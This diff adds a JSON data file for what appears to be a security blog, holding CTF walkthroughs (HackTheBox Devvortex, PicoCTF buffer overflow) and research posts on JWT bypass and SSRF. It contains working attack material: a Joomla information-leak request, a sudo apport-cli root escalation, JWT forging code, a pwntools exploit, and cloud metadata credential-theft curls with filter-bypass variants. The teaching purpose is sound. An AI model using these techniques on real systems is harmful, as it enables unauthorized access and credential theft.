@@ -1,0 +1,218 @@
+[
+  {
+    "id": "htb-machine-devvortex",
+    "title": "HackTheBox: Devvortex",
+    "slug": "htb-devvortex",
+    "category": "ctf",
+    "tags": ["HackTheBox", "Linux", "Web", "Joomla", "MySQL"],
+    "difficulty": "Easy",
+    "date": "2024-12-15",
+    "summary": "Exploiting Joomla CVE-2023-23752 to gain initial access, then leveraging MySQL credentials for privilege escalation via apport-cli.",
+    "platform": "HackTheBox",
+    "content": [
+      {
+        "type": "heading",
+        "level": 2,
+        "text": "Reconnaissance"
+      },
+      {
+        "type": "paragraph",
+        "text": "Starting with an nmap scan to identify open ports and services."
+      },
+      {
+        "type": "code",
+        "language": "bash",
+        "code": "nmap -sC -sV -oA nmap/devvortex 10.10.11.242\n\n# Results:\n# PORT   STATE SERVICE VERSION\n# 22/tcp open  ssh     OpenSSH 8.2p1\n# 80/tcp open  http    nginx 1.18.0"
+      },
+      {
+        "type": "paragraph",
+        "text": "Found a web server running nginx. Let's enumerate subdomains."
+      },
+      {
+        "type": "code",
+        "language": "bash",
+        "code": "ffuf -u http://devvortex.htb -H \"Host: FUZZ.devvortex.htb\" -w /usr/share/wordlists/subdomains.txt\n\n# Found: dev.devvortex.htb"
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "text": "Exploitation"
+      },
+      {
+        "type": "paragraph",
+        "text": "The dev subdomain runs Joomla 4.2.6, vulnerable to CVE-2023-23752 (Information Disclosure)."
+      },
+      {
+        "type": "code",
+        "language": "bash",
+        "code": "curl -s \"http://dev.devvortex.htb/api/index.php/v1/config/application?public=true\" | jq\n\n# Leaked credentials:\n# user: lewis\n# password: P4ntherg0t1n5r3c0n##"
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "text": "Privilege Escalation"
+      },
+      {
+        "type": "paragraph",
+        "text": "After gaining shell access, found MySQL credentials and escalated via apport-cli vulnerability."
+      },
+      {
+        "type": "code",
+        "language": "bash",
+        "code": "sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash\n# Press 'V' to view report\n# In less, type: !/bin/bash\n# Got root shell!"
+      },
+      {
+        "type": "flag",
+        "text": "HTB{fl4g_w0uld_b3_h3r3}"
+      }
+    ]
+  },
+  {
+    "id": "research-jwt-bypass",
+    "title": "JWT Authentication Bypass Techniques",
+    "slug": "jwt-bypass-techniques",
+    "category": "research",
+    "tags": ["JWT", "Authentication", "Web Security", "Cryptography"],
+    "difficulty": "Medium",
+    "date": "2024-11-28",
+    "summary": "Deep dive into common JWT vulnerabilities including algorithm confusion, key injection, and signature bypass methods.",
+    "content": [
+      {
+        "type": "heading",
+        "level": 2,
+        "text": "Introduction"
+      },
+      {
+        "type": "paragraph",
+        "text": "JSON Web Tokens (JWTs) are widely used for authentication. However, improper implementations can lead to severe vulnerabilities."
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "text": "Algorithm Confusion Attack"
+      },
+      {
+        "type": "paragraph",
+        "text": "When servers accept both HS256 and RS256, an attacker can sign tokens with the public key using HS256."
+      },
+      {
+        "type": "code",
+        "language": "python",
+        "code": "import jwt\nimport base64\n\n# Read the public key\nwith open('public.pem', 'r') as f:\n    public_key = f.read()\n\n# Create malicious token\npayload = {'user': 'admin', 'role': 'admin'}\ntoken = jwt.encode(payload, public_key, algorithm='HS256')\n\nprint(f'Malicious token: {token}')"
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "text": "None Algorithm Attack"
+      },
+      {
+        "type": "paragraph",
+        "text": "Some libraries accept 'none' as a valid algorithm, allowing unsigned tokens."
+      },
+      {
+        "type": "code",
+        "language": "python",
+        "code": "# Craft token with 'none' algorithm\nheader = base64.b64encode('{\"alg\":\"none\",\"typ\":\"JWT\"}'.encode()).decode().rstrip('=')\npayload = base64.b64encode('{\"user\":\"admin\"}'.encode()).decode().rstrip('=')\ntoken = f\"{header}.{payload}.\"\n\nprint(f'Unsigned token: {token}')"
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "text": "Mitigation"
+      },
+      {
+        "type": "paragraph",
+        "text": "Always explicitly specify allowed algorithms on the server side. Never accept 'none'. Use strong keys and rotate them regularly."
+      }
+    ]
+  },
+  {
+    "id": "ctf-picoctf-buffer-overflow",
+    "title": "PicoCTF: Buffer Overflow 2",
+    "slug": "picoctf-buffer-overflow-2",
+    "category": "ctf",
+    "tags": ["PicoCTF", "Binary Exploitation", "Buffer Overflow", "x86"],
+    "difficulty": "Medium",
+    "date": "2024-10-20",
+    "summary": "Classic stack-based buffer overflow with ret2win technique, bypassing stack canaries on x86 architecture.",
+    "platform": "PicoCTF",
+    "content": [
+      {
+        "type": "heading",
+        "level": 2,
+        "text": "Binary Analysis"
+      },
+      {
+        "type": "paragraph",
+        "text": "First, let's analyze the binary protections and identify the vulnerability."
+      },
+      {
+        "type": "code",
+        "language": "bash",
+        "code": "checksec --file=vuln\n# RELRO:    Partial RELRO\n# Stack:    No canary found\n# NX:       NX enabled\n# PIE:      No PIE"
+      },
+      {
+        "type": "paragraph",
+        "text": "No canary and no PIE makes this straightforward. Let's find the win function address."
+      },
+      {
+        "type": "code",
+        "language": "bash",
+        "code": "objdump -d vuln | grep win\n# 080491f2 <win>:"
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "text": "Exploit Development"
+      },
+      {
+        "type": "code",
+        "language": "python",
+        "code": "from pwn import *\n\n# Connect to target\np = remote('saturn.picoctf.net', 52574)\n\n# Build payload\noffset = 112\nwin_addr = 0x080491f2\narg1 = 0xCAFEF00D\narg2 = 0xF00DF00D\n\npayload = b'A' * offset\npayload += p32(win_addr)\npayload += p32(0xdeadbeef)  # fake return\npayload += p32(arg1)\npayload += p32(arg2)\n\np.sendline(payload)\np.interactive()"
+      },
+      {
+        "type": "flag",
+        "text": "picoCTF{argum3nt5_4_d4yZ_...}"
+      }
+    ]
+  },
+  {
+    "id": "research-ssrf-techniques",
+    "title": "Advanced SSRF Exploitation",
+    "slug": "advanced-ssrf",
+    "category": "research",
+    "tags": ["SSRF", "Cloud", "AWS", "Web Security"],
+    "difficulty": "Hard",
+    "date": "2024-09-15",
+    "summary": "Exploring advanced SSRF techniques including cloud metadata exploitation, protocol smuggling, and DNS rebinding.",
+    "content": [
+      {
+        "type": "heading",
+        "level": 2,
+        "text": "Cloud Metadata Endpoints"
+      },
+      {
+        "type": "paragraph",
+        "text": "Cloud providers expose metadata services that can leak sensitive credentials when accessed via SSRF."
+      },
+      {
+        "type": "code",
+        "language": "bash",
+        "code": "# AWS IMDSv1\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# GCP\ncurl -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\n\n# Azure\ncurl -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\""
+      },
+      {
+        "type": "heading",
+        "level": 2,
+        "text": "Bypass Techniques"
+      },
+      {
+        "type": "paragraph",
+        "text": "Various techniques to bypass SSRF filters and blocklists."
+      },
+      {
+        "type": "code",
+        "language": "text",
+        "code": "# IP address variations\nhttp://127.0.0.1\nhttp://127.1\nhttp://0x7f000001\nhttp://2130706433  # decimal\nhttp://[::1]  # IPv6\nhttp://localhost\nhttp://127.0.0.1.nip.io\n\n# URL encoding\nhttp://127.0.0.1/%2f%2e%2e\n\n# DNS rebinding\n# Use a domain that alternates between your IP and 127.0.0.1"
+      }
+    ]
+  }
+]
